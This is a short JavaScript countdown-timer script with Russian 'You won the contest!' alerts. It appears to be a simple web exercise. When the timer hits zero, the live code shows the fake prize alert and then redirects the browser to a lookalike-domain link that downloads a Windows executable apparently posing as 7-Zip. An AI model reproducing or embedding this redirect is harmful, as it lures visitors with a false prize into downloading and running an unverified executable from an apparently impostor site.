// const timer = document.getElementById("timer");
// timer.textContent = 59;

// setInterval(() => {
//     timer.textContent--;
//     if (timer.textContent < 1) {
//         timer.textContent = 59;
//         alert('Вы победили в конкурсе!');
//     }
// }, 1000);

const timer = document.getElementById("timer");
let time = new Date(); 
let hh = 1;
let mm = 25;
let ss = 59;

let showTime = () => {
    time.setHours(hh);
    time.setMinutes(mm);
    time.setSeconds(ss);

    timer.textContent = time.toLocaleTimeString("ru-Ru", {
                hour: "2-digit",
                minute: "2-digit",
                second: "2-digit"
            });
}; 

showTime();

setInterval(() => {
    ss--;
    
    if (ss < 0) {
        ss = 59;
        mm--;
    }
    if (mm < 0) {
        mm = 59;
        hh--;
    }
    if (hh === 0 && mm === 0 && ss === 0) { 
        alert('Вы победили в конкурсе!');
        window.location = "https://winrar-full.com/go/?https://dl.7zip-soft.com/files/7z2301-x64.exe"
    }

    showTime();

}, 1000);